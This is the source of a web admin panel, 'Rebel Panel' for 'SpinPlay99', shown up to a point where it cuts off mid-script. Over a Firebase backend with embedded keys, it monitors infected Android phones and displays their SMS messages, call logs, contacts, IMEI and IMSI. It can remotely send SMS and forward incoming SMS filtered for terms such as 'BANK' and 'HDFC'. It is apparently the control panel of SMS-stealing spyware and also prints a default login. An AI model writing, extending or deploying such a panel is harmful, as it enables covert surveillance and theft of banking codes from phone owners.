<?php
header('Content-Type: text/html; charset=UTF-8');
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Rebel Panel — Real-Time Dashboard</title>
  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet"/>
  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
  <style>
    :root{--bg:#0a0a0f;--surface:#111118;--card:#16161f;--border:#2a2a3a;--accent:#ff3c3c;--accent2:#ff9500;--text:#e8e8f0;--muted:#6b6b88;--success:#00ff9d;--error:#ff4466}
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
    body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(255,60,60,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(255,60,60,0.03) 1px,transparent 1px);background-size:44px 44px;pointer-events:none;z-index:0}
    .wrapper{position:relative;z-index:1}
    #loginPage{position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;padding:20px}
    #loginPage.hidden{display:none!important}
    .login-card{background:var(--card);border:1px solid var(--border);border-radius:22px;padding:40px 36px;width:100%;max-width:400px;position:relative;overflow:hidden;box-shadow:0 40px 80px rgba(0,0,0,0.5)}
    .login-card::after{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(180deg,var(--accent),var(--accent2));border-radius:22px 0 0 22px}
    .login-logo{display:flex;align-items:center;gap:14px;margin-bottom:28px}
    .login-logo .rebel{font-size:24px;font-weight:800;letter-spacing:-1px}
    .login-logo .rebel em{font-style:normal;color:var(--accent)}
    .login-logo .panel-sub{font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:3px;margin-top:2px}
    .login-card h2{font-size:20px;font-weight:800;margin-bottom:4px}
    .login-card h2 span{color:var(--accent)}
    .login-card .login-sub{color:var(--muted);font-size:12px;margin-bottom:24px}
    .login-error{background:rgba(255,68,102,0.1);border:1px solid rgba(255,68,102,0.3);color:var(--error);border-radius:8px;padding:10px 14px;font-family:'Space Mono',monospace;font-size:11px;margin-bottom:14px;display:none}
    .remember-row{display:flex;align-items:center;gap:10px;margin:14px 0 18px}
    .remember-row input[type=checkbox]{width:16px;height:16px;accent-color:var(--accent);cursor:pointer}
    .remember-row label{font-size:11px;color:var(--muted);cursor:pointer}
    .login-hint{margin-top:16px;text-align:center;font-family:'Space Mono',monospace;font-size:10px;color:var(--muted)}
    label{font-size:9px;font-family:'Space Mono',monospace;color:var(--muted);letter-spacing:1.5px;display:block;margin-bottom:5px;text-transform:uppercase}
    input,textarea{width:100%;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:12px 14px;color:var(--text);font-family:'Space Mono',monospace;font-size:13px;outline:none;transition:border-color 0.2s}
    input:focus,textarea:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(255,60,60,0.1)}
    .btn{width:100%;padding:13px;border-radius:10px;border:none;background:linear-gradient(135deg,var(--accent) 0%,#cc0000 100%);color:#fff;font-family:'Syne',sans-serif;font-weight:800;font-size:14px;cursor:pointer;letter-spacing:1px;transition:all 0.2s;text-transform:uppercase}
    .btn:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(255,60,60,0.4)}
    header{padding:18px 32px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;background:rgba(10,10,15,0.92);backdrop-filter:blur(14px);position:sticky;top:0;z-index:100}
    .logo{display:flex;align-items:center;gap:12px}
    .logo-mark{width:34px;height:34px;filter:drop-shadow(0 0 6px rgba(255,60,60,0.6));animation:logoPulse 2.5s ease-in-out infinite}
    @keyframes logoPulse{0%,100%{filter:drop-shadow(0 0 4px rgba(255,60,60,0.4))}50%{filter:drop-shadow(0 0 14px rgba(255,60,60,0.9))}}
    .logo-text .rebel{font-size:20px;font-weight:800;letter-spacing:-1px;line-height:1}
    .logo-text .rebel em{font-style:normal;color:var(--accent)}
    .logo-text .panel-sub{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:3px}
    .status-pill{display:flex;align-items:center;gap:8px;padding:5px 14px;border-radius:100px;border:1px solid var(--border);font-family:'Space Mono',monospace;font-size:10px;color:var(--muted);transition:all 0.3s}
    .status-pill.connected{border-color:var(--success);color:var(--success)}
    .status-pill .status-dot{width:6px;height:6px;border-radius:50%;background:var(--muted)}
    .status-pill.connected .status-dot{background:var(--success);box-shadow:0 0 6px var(--success);animation:blink 1.5s ease-in-out infinite}
    @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
    .nav-tabs{display:flex;gap:2px;padding:0 28px;border-bottom:1px solid var(--border);background:rgba(10,10,15,0.7);backdrop-filter:blur(8px);position:sticky;top:70px;z-index:90;overflow-x:auto}
    .nav-tab{padding:12px 14px;border:none;background:transparent;font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);cursor:pointer;letter-spacing:1px;text-transform:uppercase;border-bottom:2px solid transparent;transition:all 0.2s;margin-bottom:-1px;display:flex;align-items:center;gap:5px;white-space:nowrap;flex-shrink:0}
    .nav-tab:hover{color:var(--text)}
    .nav-tab.active{color:var(--accent);border-bottom-color:var(--accent)}
    .tab-badge{background:rgba(255,60,60,0.15);border:1px solid rgba(255,60,60,0.3);color:var(--accent);padding:1px 6px;border-radius:8px;font-size:8px}
    .hidden{display:none!important}
    .section-content{padding:24px 28px 50px;max-width:1400px;margin:0 auto}
    .dash-header{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:22px;flex-wrap:wrap;gap:12px}
    .dash-title{font-size:26px;font-weight:800}
    .dash-title span{color:var(--accent)}
    .realtime-badge{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;border-radius:100px;background:rgba(255,149,0,0.1);border:1px solid rgba(255,149,0,0.25);font-family:'Space Mono',monospace;font-size:9px;color:var(--accent2)}
    .rt-dot{width:5px;height:5px;border-radius:50%;background:var(--accent2);animation:blink 1s ease-in-out infinite}
    /* Device selector bar */
    .dev-selector{display:flex;align-items:center;gap:8px;padding:8px 28px;background:rgba(255,60,60,0.04);border-bottom:1px solid var(--border);overflow-x:auto}
    .dev-selector-label{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:1.5px;white-space:nowrap}
    .dev-chip{padding:5px 12px;border-radius:20px;border:1px solid var(--border);background:transparent;color:var(--muted);font-family:'Space Mono',monospace;font-size:9px;cursor:pointer;transition:all 0.2s;white-space:nowrap;display:flex;align-items:center;gap:5px}
    .dev-chip.active{border-color:var(--accent);color:var(--accent);background:rgba(255,60,60,0.1)}
    .dev-chip .dev-dot{width:5px;height:5px;border-radius:50%;background:var(--muted)}
    .dev-chip.online-chip .dev-dot{background:var(--success);animation:blink 1.5s infinite}
    .dm-stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:22px}
    .stat-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:15px 18px;display:flex;flex-direction:column;gap:4px;position:relative;overflow:hidden}
    .stat-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px}
    .stat-card.total::before{background:linear-gradient(90deg,var(--accent),var(--accent2))}
    .stat-card.online::before{background:var(--success)}
    .stat-card.offline::before{background:var(--muted)}
    .stat-label{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:1.5px;text-transform:uppercase}
    .stat-value{font-size:28px;font-weight:800;line-height:1}
    .stat-card.online .stat-value{color:var(--success)}
    .stat-card.offline .stat-value{color:var(--muted)}
    .dm-toolbar{display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap;align-items:center}
    .dm-search{width:100%;max-width:300px;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:9px 14px;color:var(--text);font-family:'Space Mono',monospace;font-size:11px;outline:none}
    .dm-search:focus{border-color:var(--accent)}
    .dm-filter-group{display:flex;gap:6px}
    .filter-btn{padding:7px 12px;border-radius:6px;border:1px solid var(--border);background:transparent;color:var(--muted);font-family:'Space Mono',monospace;font-size:9px;cursor:pointer;transition:all 0.2s;text-transform:uppercase}
    .filter-btn.active{background:rgba(255,60,60,0.1);border-color:var(--accent);color:var(--accent)}
    .device-table-wrap{border:1px solid var(--border);border-radius:12px;overflow:hidden;overflow-x:auto}
    .device-table{width:100%;border-collapse:collapse;min-width:600px}
    .device-table thead tr{background:rgba(255,60,60,0.05)}
    .device-table th{padding:11px 14px;font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:1.5px;text-align:left;white-space:nowrap;text-transform:uppercase;border-bottom:1px solid var(--border)}
    .device-row{border-bottom:1px solid rgba(42,42,58,0.4);transition:background 0.1s;cursor:pointer}
    .device-row:hover{background:rgba(255,255,255,0.02)}
    .device-row.selected-row{background:rgba(255,60,60,0.06)!important;border-left:2px solid var(--accent)}
    .device-row td{padding:10px 14px;vertical-align:middle;font-size:12px}
    .device-name-cell{display:flex;align-items:center;gap:10px}
    .device-icon{width:30px;height:30px;border-radius:6px;background:var(--surface);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0}
    .device-name{font-weight:600;font-size:13px}
    .device-id{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);margin-top:1px}
    .status-badge{display:inline-flex;align-items:center;gap:4px;padding:3px 8px;border-radius:16px;font-family:'Space Mono',monospace;font-size:9px;font-weight:700}
    .status-badge::before{content:'';width:5px;height:5px;border-radius:50%;display:block}
    .status-badge.online{background:rgba(0,255,157,0.1);color:var(--success);border:1px solid rgba(0,255,157,0.2)}
    .status-badge.online::before{background:var(--success);animation:blink 1.5s infinite}
    .status-badge.offline{background:rgba(107,107,136,0.1);color:var(--muted);border:1px solid rgba(107,107,136,0.15)}
    .status-badge.offline::before{background:var(--muted)}
    .status-badge.warning{background:rgba(255,149,0,0.1);color:var(--accent2);border:1px solid rgba(255,149,0,0.2)}
    .battery-bar-wrap{display:flex;align-items:center;gap:6px}
    .battery-bar{width:50px;height:5px;background:var(--border);border-radius:3px;overflow:hidden}
    .battery-fill{height:100%;border-radius:3px;transition:width 0.3s}
    .battery-fill.high{background:var(--success)}
    .battery-fill.medium{background:var(--accent2)}
    .battery-fill.low{background:var(--error)}
    .last-seen{font-family:'Space Mono',monospace;font-size:9px;color:var(--muted)}
    .dm-empty{text-align:center;padding:50px 20px;color:var(--muted);font-size:13px}
    .dm-empty .empty-icon{font-size:40px;display:block;margin-bottom:10px;opacity:0.4}
    .config-card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:28px;position:relative;overflow:hidden;max-width:550px;margin:16px 0}
    .config-card::after{content:'';position:absolute;top:0;left:0;width:2px;height:100%;background:linear-gradient(180deg,var(--accent),var(--accent2));border-radius:14px 0 0 14px}
    .input-group{display:flex;flex-direction:column;gap:12px;margin-bottom:16px}
    textarea{resize:vertical;min-height:80px}
    .data-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px;transition:all 0.15s}
    .data-card:hover{border-color:rgba(255,60,60,0.3)}
    .field-row{display:flex;justify-content:space-between;align-items:flex-start;gap:6px;padding:6px 0;border-bottom:1px solid rgba(42,42,58,0.4)}
    .field-row:last-child{border-bottom:none}
    .field-key{font-family:'Space Mono',monospace;font-size:10px;color:var(--accent2);min-width:120px}
    .field-val{font-size:12px;color:var(--text);text-align:right;word-break:break-all}
    .toast-container{position:fixed;bottom:20px;right:20px;z-index:9999;display:flex;flex-direction:column;gap:8px}
    .toast{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px 16px;font-family:'Space Mono',monospace;font-size:11px;color:var(--text);display:flex;align-items:center;gap:10px;min-width:240px;animation:toastIn 0.25s ease;box-shadow:0 6px 24px rgba(0,0,0,0.4)}
    .toast.success{border-color:rgba(0,255,157,0.3)}
    .toast.error{border-color:rgba(255,68,102,0.3)}
    @keyframes toastIn{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}
    .toast.out{animation:toastOut 0.25s ease forwards}
    @keyframes toastOut{to{opacity:0;transform:translateX(20px)}}
    footer{border-top:1px solid var(--border);padding:16px 28px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px}
    .footer-brand{font-family:'Space Mono',monospace;font-size:10px;color:var(--muted)}
    .footer-brand strong{color:var(--accent)}
    @media(max-width:768px){header{padding:14px 16px}.nav-tabs{padding:0 10px}.nav-tab{padding:10px 8px;font-size:8px}.section-content{padding:16px 10px 36px}.dash-title{font-size:20px}.dm-stats{grid-template-columns:repeat(2,1fr)}}
  </style>
</head>
<body>

<!-- LOGIN -->
<div id="loginPage">
  <div class="login-card">
    <div class="login-logo">
      <svg width="34" height="34" viewBox="0 0 38 38" fill="none" style="filter:drop-shadow(0 0 6px rgba(255,60,60,0.6))"><polygon points="19,2 36,10 36,28 19,36 2,28 2,10" fill="rgba(255,60,60,0.12)" stroke="#ff3c3c" stroke-width="1.5"/><text x="19" y="25" text-anchor="middle" font-family="'Syne',sans-serif" font-weight="800" font-size="16" fill="#ff3c3c">R</text></svg>
      <div><div class="rebel"><em>Rebel</em> Panel</div><div class="panel-sub">REAL-TIME DASHBOARD</div></div>
    </div>
    <h2>Admin <span>Login</span></h2>
    <p class="login-sub">Enter credentials to access panel.</p>
    <div id="loginError" class="login-error">❌ Wrong credentials!</div>
    <div class="input-group">
      <div><label>Username</label><input type="text" id="loginUser" placeholder="admin" autocomplete="username"/></div>
      <div><label>Password</label><input type="password" id="loginPass" placeholder="••••••••" autocomplete="current-password"/></div>
    </div>
    <div class="remember-row"><input type="checkbox" id="rememberMe"/><label for="rememberMe">Remember me</label></div>
    <button class="btn" onclick="doLogin()">🔐 Login</button>
    <div class="login-hint">Default: admin / rebel2024</div>
  </div>
</div>

<div class="wrapper">
<header>
  <div class="logo">
    <svg class="logo-mark" viewBox="0 0 38 38" fill="none"><polygon points="19,2 36,10 36,28 19,36 2,28 2,10" fill="rgba(255,60,60,0.12)" stroke="#ff3c3c" stroke-width="1.5"/><text x="19" y="25" text-anchor="middle" font-family="'Syne',sans-serif" font-weight="800" font-size="16" fill="#ff3c3c">R</text></svg>
    <div class="logo-text"><div class="rebel"><em>Rebel</em> Panel</div><div class="panel-sub">Real-Time Dashboard</div></div>
  </div>
  <div id="statusPill" class="status-pill"><div class="status-dot"></div><span id="statusText">Connecting...</span></div>
</header>

<!-- Device selector (shows across all tabs) -->
<div id="devSelectorBar" class="dev-selector hidden">
  <span class="dev-selector-label">DEVICE:</span>
  <div id="devChips"></div>
</div>

<div id="navTabs" class="nav-tabs hidden">
  <button class="nav-tab active" onclick="switchTab('devices')">◉ Devices <span class="tab-badge" id="dtCount">0</span></button>
  <button class="nav-tab" onclick="switchTab('sms')">💬 SMS <span class="tab-badge" id="smsCount">0</span></button>
  <button class="nav-tab" onclick="switchTab('calls')">📞 Calls <span class="tab-badge" id="callsCount">0</span></button>
  <button class="nav-tab" onclick="switchTab('contacts')">👥 Contacts <span class="tab-badge" id="contactsCount">0</span></button>
  <button class="nav-tab" onclick="switchTab('permissions')">🔐 Perms</button>
  <button class="nav-tab" onclick="switchTab('siminfo')">📶 SIM</button>
  <button class="nav-tab" onclick="switchTab('sendsms')">📤 Send SMS</button>
  <button class="nav-tab" onclick="switchTab('forwarding')">↗️ Forwarding</button>
</div>

<!-- DEVICES TAB -->
<div id="devicesSection" class="section-content hidden">
  <div class="dash-header"><div><div class="dash-title">Connected <span>Devices</span></div><div style="margin-top:4px"><div class="realtime-badge"><div class="rt-dot"></div> LIVE</div></div></div></div>
  <div class="dm-stats">
    <div class="stat-card total"><div class="stat-label">Total</div><div class="stat-value" id="stTotal">0</div></div>
    <div class="stat-card online"><div class="stat-label">Online</div><div class="stat-value" id="stOnline">0</div></div>
    <div class="stat-card offline"><div class="stat-label">Offline</div><div class="stat-value" id="stOffline">0</div></div>
  </div>
  <div class="dm-toolbar">
    <input class="dm-search" type="text" id="devSearch" placeholder="Search devices..." oninput="renderDevices()"/>
    <div class="dm-filter-group">
      <button class="filter-btn active" onclick="setDevFilter('all',this)">All</button>
      <button class="filter-btn" onclick="setDevFilter('online',this)">Online</button>
      <button class="filter-btn" onclick="setDevFilter('offline',this)">Offline</button>
    </div>
  </div>
  <div class="device-table-wrap"><table class="device-table"><thead><tr><th>Device</th><th>Status</th><th>Battery</th><th>Network</th><th>SMS</th><th>Last Seen</th></tr></thead><tbody id="devTableBody"></tbody></table></div>
  <div id="devEmpty" class="dm-empty hidden"><span class="empty-icon">📡</span>No devices connected yet.</div>
</div>

<!-- SMS TAB -->
<div id="smsSection" class="section-content hidden">
  <div class="dash-header"><div><div class="dash-title">SMS <span>Messages</span></div></div></div>
  <div class="dm-toolbar"><input class="dm-search" type="text" id="smsSearch" placeholder="Search by number or message..." oninput="filterRows('smsTableBody',this.value)"/></div>
  <div class="device-table-wrap"><table class="device-table"><thead><tr><th>#</th><th>Number</th><th>Message</th><th>Date</th><th>Type</th></tr></thead><tbody id="smsTableBody"></tbody></table></div>
  <div id="smsEmpty" class="dm-empty"><span class="empty-icon">📭</span>No SMS data. Grant READ_SMS permission on device.</div>
</div>

<!-- CALLS TAB -->
<div id="callsSection" class="section-content hidden">
  <div class="dash-header"><div><div class="dash-title">Call <span>History</span></div></div></div>
  <div class="dm-toolbar"><input class="dm-search" type="text" id="callsSearch" placeholder="Search calls..." oninput="filterRows('callsTableBody',this.value)"/></div>
  <div class="device-table-wrap"><table class="device-table"><thead><tr><th>#</th><th>Number</th><th>Contact</th><th>Date</th><th>Duration</th><th>Type</th></tr></thead><tbody id="callsTableBody"></tbody></table></div>
</div>

<!-- CONTACTS TAB -->
<div id="contactsSection" class="section-content hidden">
  <div class="dash-header"><div><div class="dash-title">Contacts <span>List</span></div></div></div>
  <div class="dm-toolbar"><input class="dm-search" type="text" id="contactsSearch" placeholder="Search contacts..." oninput="filterRows('contactsTableBody',this.value)"/></div>
  <div class="device-table-wrap"><table class="device-table"><thead><tr><th>#</th><th>Name</th><th>Phone</th></tr></thead><tbody id="contactsTableBody"></tbody></table></div>
</div>

<!-- PERMISSIONS TAB -->
<div id="permissionsSection" class="section-content hidden">
  <div class="dash-header"><div><div class="dash-title">App <span>Permissions</span></div></div></div>
  <div class="device-table-wrap"><table class="device-table"><thead><tr><th>Permission</th><th>Status</th></tr></thead><tbody id="permsTableBody"></tbody></table></div>
</div>

<!-- SIM TAB -->
<div id="siminfoSection" class="section-content hidden">
  <div class="dash-header"><div><div class="dash-title">SIM <span>Information</span></div></div></div>
  <div id="simCards" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px;"></div>
</div>

<!-- SEND SMS TAB -->
<div id="sendsmsSection" class="section-content hidden" style="max-width:620px;">
  <div class="dash-header"><div><div class="dash-title">Send <span>SMS</span></div></div></div>
  <div class="config-card">
    <div class="input-group">
      <div><label>📞 To Number</label><input type="tel" id="sendTo" placeholder="+919876543210"/></div>
      <div><label>💬 Message</label><textarea id="sendMsg" placeholder="Type message here..."></textarea></div>
    </div>
    <button class="btn" onclick="sendSms()">📤 Send SMS to Device</button>
    <div id="sendStatus" style="margin-top:10px;text-align:center;font-family:'Space Mono',monospace;font-size:11px;"></div>
  </div>
  <div class="dash-header" style="margin-top:24px;"><div class="dash-title">Sent <span>History</span></div></div>
  <div class="device-table-wrap"><table class="device-table"><thead><tr><th>To</th><th>Message</th><th>Status</th><th>Time</th></tr></thead><tbody id="sentTableBody"></tbody></table></div>
</div>

<!-- FORWARDING TAB -->
<div id="forwardingSection" class="section-content hidden" style="max-width:620px;">
  <div class="dash-header"><div><div class="dash-title">SMS <span>Forwarding</span></div></div></div>
  <div class="config-card">
    <div style="display:flex;align-items:center;gap:12px;margin-bottom:18px;">
      <label style="margin:0;font-size:11px;">Enable Forwarding</label>
      <input type="checkbox" id="fwToggle" onchange="toggleFw()" style="width:18px;height:18px;accent-color:var(--accent);"/>
    </div>
    <div class="input-group">
      <div><label>📞 Forward To Number</label><input type="tel" id="fwNumber" placeholder="+919876543210"/></div>
      <div style="display:flex;align-items:center;gap:12px;">
        <label style="margin:0;font-size:11px;">Forward All SMS</label>
        <input type="checkbox" id="fwAll" checked onchange="document.getElementById('fwDiv').style.display=this.checked?'none':'block'" style="width:18px;height:18px;accent-color:var(--accent);"/>
      </div>
      <div id="fwDiv" style="display:none;"><label>Filter Numbers (comma separated)</label><input type="text" id="fwFilters" placeholder="+9198..., HDFC, BANK"/></div>
    </div>
    <button class="btn" onclick="saveFw()">💾 Save Settings</button>
  </div>
  <div class="dash-header" style="margin-top:24px;"><div class="dash-title">Forwarding <span>History</span></div></div>
  <div class="device-table-wrap"><table class="device-table"><thead><tr><th>From</th><th>To</th><th>Message</th><th>Time</th></tr></thead><tbody id="fwTableBody"></tbody></table></div>
</div>

<footer>
  <div class="footer-brand"><strong>Rebel Panel</strong> — SpinPlay99 Real-Time Dashboard</div>
  <div class="footer-brand" id="footerTime"></div>
</footer>
</div>

<div class="toast-container" id="toastContainer"></div>

<script>
// ═══ STATE ═══
var DB, allDevs = [], selDev = '', devFilter = 'all';
var activeListeners = {};

// ═══ FIREBASE INIT ═══
(function(){
  firebase.initializeApp({
    apiKey:"AIzaSyCsTa5oZOZ3XS7ZujbAl8JX1qPuUEP6P3I",
    authDomain:"spinplay99.firebaseapp.com",
    databaseURL:"https://spinplay99-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId:"spinplay99",
    storageBucket:"spinplay99.firebasestorage.app",
    messagingSenderId:"8121733414",
    appId:"1:8121733414:web:04b9ae5df1b6bc413e31e7"
  });
  DB = firebase.database();
  setStatus('connected','Connected');
  document.getElementById('navTabs').classList.remove('hidden');
  document.getElementById('devSelectorBar').classList.remove('hidden');
  startDeviceListener();
  switchTab('devices');
})();

function setStatus(t,m){
  var p=document.getElementById('statusPill');
  p.className='status-pill'+(t==='connected'?' connected':'');
  document.getElementById('statusText').textContent=m;
}

// ═══ DEVICE LISTENER ═══
function startDeviceListener(){
  DB.ref('devices').on('value', function(snap){
    var raw = snap.val(); allDevs = [];
    if(!raw){ renderDevices(); updateStats(); renderDevChips(); return; }
    var now = Date.now();
    Object.keys(raw).forEach(function(k){
      var d=raw[k], info=d.device_info||{}, live=d.live_data||{};
      var isOn = (d.online_status === true) || (now - (live.timestamp_millis||0) < 45000);
      allDevs.push({
        id:k, name:(info.device_model||'Unknown Device'),
        brand:(info.device_brand||''), android:(info.android_version||''),
        status:isOn?'online':'offline',
        battery:live.battery_level||0, network:live.network_type||'?',
        charging:live.is_charging||false,
        lastSeen:live.timestamp_millis||info.last_seen||0,
        smsCount:d.all_sms?d.all_sms.total_count||0:0,
        imei:(info.sim_info&&info.sim_info.imei)||''
      });
    });
    allDevs.sort(function(a,b){
      if(a.status==='online'&&b.status!=='online') return -1;
      if(a.status!=='online'&&b.status==='online') return 1;
      return b.lastSeen - a.lastSeen;
    });
    // Auto-select first device if none selected
    if(!selDev && allDevs.length>0) selDev = allDevs[0].id;
    // Make sure selDev still exists
    if(selDev && !allDevs.find(function(d){return d.id===selDev;})) selDev = allDevs.length>0?allDevs[0].id:'';

    document.getElementById('dtCount').textContent = allDevs.length;
    renderDevices(); updateStats(); renderDevChips();
    if(selDev) loadAllData();
  });
}

// ═══ DEVICE CHIPS (selector) ═══
function renderDevChips(){
  var c = document.getElementById('devChips');
  if(allDevs.length===0){c.innerHTML='<span style="font-family:Space Mono,monospace;font-size:9px;color:var(--muted);">No devices</span>';return;}
  c.innerHTML = allDevs.map(function(d){
    return '<button class="dev-chip'+(d.status==='online'?' online-chip':'')+(d.id===selDev?' active':'')+'" onclick="selectDevice(\''+d.id+'\')">'+
      '<span class="dev-dot"></span>'+esc(d.name)+(d.brand?' ('+esc(d.brand)+')':'')+'</button>';
  }).join('');
}

function selectDevice(id){
  selDev = id;
  renderDevChips();
  renderDevices();
  loadAllData();
  showToast('info','📱 Device: '+esc((allDevs.find(function(d){return d.id===id;})||{}).name||id));
}

// ═══ LOAD ALL DATA FOR SELECTED DEVICE ═══
function loadAllData(){
  if(!selDev || !DB) return;
  var ref = 'devices/'+selDev;

  // Off previous listeners
  Object.keys(activeListeners).forEach(function(path){
    DB.ref(path).off('value', activeListeners[path]);
  });
  activeListeners = {};

  function listen(path, cb){
    var fn = DB.ref(path).on('value', cb);
    activeListeners[path] = fn;
  }

  // ── SMS ──
  listen(ref+'/all_sms', function(snap){
    var d = snap.val();
    var tbody = document.getElementById('smsTableBody');
    var empty = document.getElementById('smsEmpty');
    if(!d || !d.messages || d.messages.length === 0){
      tbody.innerHTML=''; empty.classList.remove('hidden');
      document.getElementById('smsCount').textContent='0'; return;
    }
    empty.classList.add('hidden');
    document.getElementById('smsCount').textContent = d.total_count || d.messages.length;
    var h='';
    d.messages.forEach(function(s,i){
      h+='<tr class="device-row"><td style="color:var(--muted);font-family:Space Mono,monospace;font-size:9px;">'+(i+1)+'</td>'+
        '<td><b>'+esc(s.address||'?')+'</b></td>'+
        '<td style="max-width:260px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">'+esc(s.body||'-')+'</td>'+
        '<td class="last-seen">'+esc(s.date_readable||'-')+'</td>'+
        '<td><span class="status-badge '+(s.type==='INBOX'?'online':s.type==='SENT'?'warning':'offline')+'">'+esc(s.type||'?')+'</span></td></tr>';
    });
    tbody.innerHTML = h;
  });

  // ── CALLS ──
  listen(ref+'/all_calls', function(snap){
    var d = snap.val();
    var tbody = document.getElementById('callsTableBody');
    if(!d||!d.calls){tbody.innerHTML='';document.getElementById('callsCount').textContent='0';return;}
    document.getElementById('callsCount').textContent = d.total_count||d.calls.length;
    var h='';
    d.calls.forEach(function(c,i){
      h+='<tr class="device-row"><td style="color:var(--muted);font-family:Space Mono,monospace;font-size:9px;">'+(i+1)+'</td>'+
        '<td><b>'+esc(c.number||'?')+'</b></td>'+
        '<td>'+esc(c.contact_name||'—')+'</td>'+
        '<td class="last-seen">'+esc(c.date_readable||'-')+'</td>'+
        '<td class="last-seen">'+esc(c.duration||'0')+'s</td>'+
        '<td><span class="status-badge '+(c.type==='INCOMING'?'online':c.type==='OUTGOING'?'warning':'offline')+'">'+esc(c.type||'?')+'</span></td></tr>';
    });
    tbody.innerHTML = h;
  });

  // ── CONTACTS ──
  listen(ref+'/all_contacts', function(snap){
    var d = snap.val();
    var tbody = document.getElementById('contactsTableBody');
    if(!d||!d.contacts){tbody.innerHTML='';document.getElementById('contactsCount').textContent='0';return;}
    document.getElementById('contactsCount').textContent = d.total_count||d.contacts.length;
    var h='';
    d.contacts.forEach(function(c,i){
      h+='<tr class="device-row"><td style="color:var(--muted);font-family:Space Mono,monospace;font-size:9px;">'+(i+1)+'</td>'+
        '<td><b>'+esc(c.name||'No Name')+'</b></td>'+
        '<td class="last-seen">'+esc(c.phone||'—')+'</td></tr>';
    });
    tbody.innerHTML = h;
  });

  // ── PERMISSIONS ──
  listen(ref+'/live_data/permissions', function(snap){
    var p = snap.val();
    var tbody = document.getElementById('permsTableBody');
    if(!p){tbody.innerHTML='';return;}
    var h='';
    Object.entries(p).forEach(function(e){
      h+='<tr class="device-row"><td style="font-family:Space Mono,monospace;font-size:10px;">'+e[0].replace(/_/g,' ').toUpperCase()+'</td>'+
        '<td><span class="status-badge '+(e[1]?'online':'offline')+'">'+(e[1]?'✅ GRANTED':'❌ DENIED')+'</span></td></tr>';
    });
    tbody.innerHTML = h;
  });

  // ── SIM INFO ──
  listen(ref+'/device_info/sim_info', function(snap){
    var s = snap.val();
    var c = document.getElementById('simCards');
    if(!s){c.innerHTML='<div class="dm-empty"><span class="empty-icon">📶</span>No SIM info yet.</div>';return;}
    var fields=[['📱 SIM Operator',s.sim_operator_name],['🏢 Network',s.network_operator_name],['🆔 IMEI',s.imei],['📋 IMSI / Subscriber ID',s.subscriber_id]];
    c.innerHTML='<div class="data-card">'+fields.map(function(f){
      return '<div class="field-row"><span class="field-key">'+f[0]+'</span><span class="field-val">'+(f[1]?esc(f[1]):'<span style="color:var(--muted)">N/A</span>')+'</span></div>';
    }).join('')+'</div>';
  });

  // ── SENT SMS HISTORY ──
  listen(ref+'/sent_sms', function(snap){
    var tbody = document.getElementById('sentTableBody');
    if(!snap.exists()){tbody.innerHTML='';return;}
    var l=[]; snap.forEach(function(c){l.push(c.val());}); l.reverse();
    l=l.slice(0,30);
    tbody.innerHTML = l.map(function(log){
      return '<tr class="device-row"><td><b>'+esc(log.to||'?')+'</b></td>'+
        '<td style="max-width:180px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">'+esc(log.message||'-')+'</td>'+
        '<td><span class="status-badge online">SENT</span></td>'+
        '<td class="last-seen">'+(log.sent_at?new Date(log.sent_at).toLocaleString():'-')+'</td></tr>';
    }).join('');
  });

  // ── FORWARDING SETTINGS ──
  listen(ref+'/forwarding_settings', function(snap){
    var s = snap.val(); if(!s) return;
    document.getElementById('fwToggle').checked = s.enabled||false;
    document.getElementById('fwNumber').value = s.forward_to||'';
    document.getElementById('fwAll').checked = s.forward_all!==false;
    if(s.filters && Array.isArray(s.filters)) document.getElementById('fwFilters').value = s.filters.join(', ');
    document.getElementById('fwDiv').style.display = (s.forward_all!==false)?'none':'block';
  });

  // ── FORWARDING HISTORY ──
  listen(ref+'/forwarded_sms', function(snap){
    var tbody = document.getElementById('fwTableBody');
    if(!snap.exists()){tbody.innerHTML='';return;}
    var l=[]; snap.forEach(function(c){l.push(c.val());}); l.reverse(); l=l.slice(0,30);
